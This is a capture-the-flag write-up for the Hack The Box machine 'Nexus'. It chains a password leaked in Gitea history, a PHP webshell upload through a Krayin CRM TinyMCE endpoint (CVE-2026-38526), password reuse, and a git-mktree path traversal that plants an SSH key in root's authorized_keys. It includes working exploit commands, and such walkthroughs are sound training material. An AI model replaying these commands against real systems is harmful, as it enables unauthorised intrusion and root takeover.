## Summary

Nexus is an Easy Linux machine themed around the **"Nexus Energy Authority"**. The
public site on `nexus.htb` is static, but a virtual-host scan reveals
`git.nexus.htb` running **Gitea 1.26.0** with a public repository
`admin/krayin-docker-setup`. That repo's **git history** leaks a database password
(`N27xh!!2ucY04`) that was committed and later removed — and it doubles as the
**Krayin CRM** admin password for `j.matthew@nexus.htb` on a third vhost,
`billing.nexus.htb`. Krayin CRM **2.2.0** is vulnerable to **CVE-2026-38526**, an
authenticated arbitrary-file-upload in the TinyMCE media endpoint
(`/admin/tinymce/upload`) that performs no server-side type checking, so a PHP
webshell uploaded as a fake PNG lands in `/storage/tinymce/` and executes — **RCE as
`www-data`**. Reading the on-disk `/var/www/krayin/.env` yields the *real* database
password (`y27xb3ha!!74GbR`), which is reused as system user **jones**' password →
SSH and the user flag. Privilege escalation abuses a custom **`template-sync.py`**
script that a systemd timer runs **as root every minute**: it copies files out of any
Gitea repo flagged as a *template* into a staging directory, using the git tree paths
**without sanitising `../`**. As jones (valid Gitea credentials) a repository is built
with a hand-crafted git tree whose single entry is
`../../../../../root/.ssh/authorized_keys`; once the repo is marked a template, the
root cron writes our SSH key into root's home — **SSH as root** and the root flag.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Nexus | Easy | Linux | Hack The Box |

## Attack Path

1. Nmap shows only SSH (22) and HTTP (80); the web root redirects to `http://nexus.htb/`.
2. `nexus.htb` is a static corporate site ("Nexus Energy Authority") leaking the emails `careers@nexus.htb` and `j.matthew@nexus.htb`.
3. A virtual-host fuzz against `Host: FUZZ.nexus.htb` discovers **`git.nexus.htb`**.
4. `git.nexus.htb` is **Gitea 1.26.0** with a public repo `admin/krayin-docker-setup` and two users: `admin`, `jones`.
5. The repo's `.env` points the app at **`billing.nexus.htb`** (Krayin CRM); the **commit diff** leaks `DB_PASSWORD=N27xh!!2ucY04`, removed in a later commit.
6. The leaked password is the **Krayin admin password**: `j.matthew@nexus.htb : N27xh!!2ucY04` logs into `billing.nexus.htb/admin`.
7. Krayin CRM **2.2.0** is vulnerable to **CVE-2026-38526** — authenticated arbitrary file upload via `POST /admin/tinymce/upload` (no MIME/extension validation).
8. A PHP webshell uploaded as `sh.php` with `Content-Type: image/png` is stored at `/storage/tinymce/<hash>.php` and runs — **RCE as `www-data`**.
9. `cat /var/www/krayin/.env` reveals the real DB password **`y27xb3ha!!74GbR`**.
10. That password is reused for **jones** (Gitea login *and* system account): `ssh jones@nexus` → `/home/jones/user.txt`.
11. Enumeration shows `gitea-template-sync.timer` running `/etc/gitea/template-sync.py` **as root every minute**.
12. The script copies files from any *template* Gitea repo into `/home/git/template-staging/<owner>/<name>` using `git ls-tree` paths **without `../` sanitisation** → arbitrary root file write.
13. As jones, a repo is pushed whose git tree entry is `../../../../../root/.ssh/authorized_keys` (git `mktree` accepts `..` path components), then marked `template:true` via the Gitea API.
14. The next root sync writes our public key into `/root/.ssh/authorized_keys` → **SSH as root** → `/root/root.txt`.

## Reconnaissance

A full TCP scan over the lab VPN found just two open ports:

```bash
nmap -Pn -p- --min-rate 2000 -T4 10.129.42.224
nmap -Pn -sCV -p22,80 10.129.42.224
```

```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu 24.04)
80/tcp open  http  nginx 1.24.0 (Ubuntu)   ->  redirects to http://nexus.htb/
```

After adding `nexus.htb` to `/etc/hosts`, the site is a static "Nexus Energy
Authority" page. Any unknown `*.nexus.htb` host 302-redirects to `nexus.htb`, so
filtering those out exposes a second virtual host:

```bash
ffuf -u http://10.129.42.224/ -H 'Host: FUZZ.nexus.htb' -w subdomains.txt -fc 302
# -> git
```

## Gitea — Leaked Credentials in Git History

`git.nexus.htb` is **Gitea 1.26.0**. The Explore page lists one public repository,
`admin/krayin-docker-setup`, and two users (`admin`, `jones`). The repo holds an
`.env` and `docker-compose.yml` for a **Krayin CRM** deployment whose `APP_URL` is
`http://billing.nexus.htb`.

The current `.env` has an empty `DB_PASSWORD`, but the **commit history** does not:

```bash
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/1615c465...diff
```

```diff
+DB_USERNAME=krayin
+DB_PASSWORD=N27xh!!2ucY04
```

A later commit blanks the value — but git never forgets.

## Krayin CRM 2.2.0 — CVE-2026-38526 (Authenticated File Upload RCE)

`billing.nexus.htb` is Krayin CRM with `APP_DEBUG=true` (Laravel debugbar leaks full
`/var/www/krayin` paths). The leaked password is the admin password for the email
seen earlier:

```
j.matthew@nexus.htb : N27xh!!2ucY04   ->  /admin/dashboard
```

Krayin **2.2.0** is affected by **CVE-2026-38526**: the TinyMCE media upload endpoint
`POST /admin/tinymce/upload` does not validate the uploaded file's type, so an
authenticated user can upload an executable `.php` file. CSRF is satisfied with the
Laravel `XSRF-TOKEN` cookie sent back as the `X-XSRF-TOKEN` header.

```bash
# login -> grab XSRF cookie -> upload PHP as a fake PNG
curl -s -b cookies -H "X-XSRF-TOKEN: $XSRF" \
  -F 'file=@sh.php;type=image/png;filename=sh.php' \
  http://billing.nexus.htb/admin/tinymce/upload
# {"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}
```

```bash
curl 'http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=id'
# uid=33(www-data) gid=33(www-data)  on host "nexus"
```

The webshell is a one-line PHP wrapper that passes the `cmd` GET parameter to the
shell, giving command execution as `www-data`.

## Pivot to jones — Reused Database Password

The app's real configuration on disk carries a different password than the one leaked
in git:

```bash
cat /var/www/krayin/.env
# DB_PASSWORD=y27xb3ha!!74GbR
```

`/etc/passwd` has a single human user, `jones` (uid 1000), whose mailbox alias is
`j.matthew@nexus.htb`. The on-disk DB password is reused as **jones**' password —
confirmed against the Gitea API and then SSH:

```bash
ssh jones@10.129.42.224          # password: y27xb3ha!!74GbR
id   # uid=1000(jones)
cat ~/user.txt
```

## Privilege Escalation — Root Path Traversal in template-sync.py

Listening services and timers reveal a custom automation:

```
root  /usr/bin/python3 /etc/gitea/template-sync.py
gitea-template-sync.timer  ->  OnUnitActiveSec=1min  (User=root)
```

`/etc/gitea/template-sync.py` (world-readable) queries the Gitea API for repositories
flagged as **templates**, then for each one reads its files from the bare repo and
writes them into a staging directory:

```python
REPO_ROOT   = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
...
for mode, objhash, filepath in entries:        # filepath comes from `git ls-tree -r HEAD`
    target = os.path.join(stage_path, filepath) # <-- no sanitisation of '../'
    os.makedirs(os.path.dirname(target), exist_ok=True)
    ...
    with open(target, 'wb') as f:
        f.write(cat_result.stdout)
```

`os.path.join(stage_path, filepath)` with a `filepath` containing `../` walks **out
of** the staging directory, and because the script runs as **root**, it is an
arbitrary file write as root. Git normally refuses `..` path components, but they can
be forced with low-level plumbing — `git mktree` happily accepts an entry named `..`.

jones has valid Gitea credentials (`jones : y27xb3ha!!74GbR`), so the attack is:

```bash
# 1. craft a tree whose only path is ../../../../../root/.ssh/authorized_keys
blob=$(git hash-object -w authorized_keys)            # = attacker public key
t=$(printf '100644 blob %s\tauthorized_keys\n' "$blob" | git mktree)
t=$(printf '040000 tree %s\t.ssh\n' "$t" | git mktree)
t=$(printf '040000 tree %s\troot\n' "$t" | git mktree)
for i in 1 2 3 4 5; do t=$(printf '040000 tree %s\t..\n' "$t" | git mktree); done
c=$(git commit-tree "$t" -m pwn); git update-ref refs/heads/main "$c"

# 2. create the repo, push the malicious tree, flag it as a template
curl -u jones:$GP -X POST  http://localhost:3000/api/v1/user/repos -d '{"name":"tmpl","default_branch":"main"}'
git push http://jones:$GP@localhost:3000/jones/tmpl.git main
curl -u jones:$GP -X PATCH http://localhost:3000/api/v1/repos/jones/tmpl -d '{"template":true}'
```

`git ls-tree -r` of that commit prints the single entry
`../../../../../root/.ssh/authorized_keys`. Within a minute the root timer fires,
`os.makedirs` creates `/root/.ssh`, and our key is written to
`/root/.ssh/authorized_keys`:

```bash
ssh -i rootkey root@10.129.42.224
id   # uid=0(root)
cat /root/root.txt
```

## Vulnerability Analysis

- **Secret in git history (Gitea):** a password committed then "removed" stays in the
  commit objects and is trivially recovered from the diff — and here it was reused as
  an application admin password.
- **CVE-2026-38526 (Krayin CRM 2.2.x):** `POST /admin/tinymce/upload` trusts the
  client-supplied filename/MIME and stores files under a web-served, PHP-executable
  path, turning an authenticated session into RCE.
- **Password reuse:** the on-disk DB password equals the interactive user's password,
  bridging `www-data` → `jones`.
- **Path traversal as root (`template-sync.py`):** unsanitised `git ls-tree` paths in
  `os.path.join(staging, filepath)` allow `../` escape, and a root-owned systemd timer
  turns it into arbitrary root file write. Any user who can mark a Gitea repo as a
  template controls the input.

## Tools Used

- `nmap` — port and service discovery
- `ffuf` — virtual-host enumeration
- `curl` — Gitea/Krayin API interaction, webshell driver, file upload
- Gitea web/API — repo creation, template flag
- `mysql` — Krayin database inspection
- `git` plumbing (`hash-object`, `mktree`, `commit-tree`) — crafting the traversal tree
- `ssh` / `ssh-keygen` — jones login and root key-based access

## Key Takeaways

- Always pull a discovered Gitea/GitLab repo's **full history** — deleted secrets live
  in old commits.
- A single leaked password unlocked the whole chain twice over (Krayin admin, then a
  *second* on-disk password reused for the system user).
- File-upload endpoints that store user files in a script-executable directory are RCE
  waiting to happen; CVE-2026-38526 is exactly that pattern in Krayin CRM 2.2.0.
- Untrusted data flowing into `os.path.join()` is a path-traversal sink — git tree
  entry names are attacker-controlled (and `..` can be forced with `git mktree`), so a
  root-run sync script becomes arbitrary root file write.
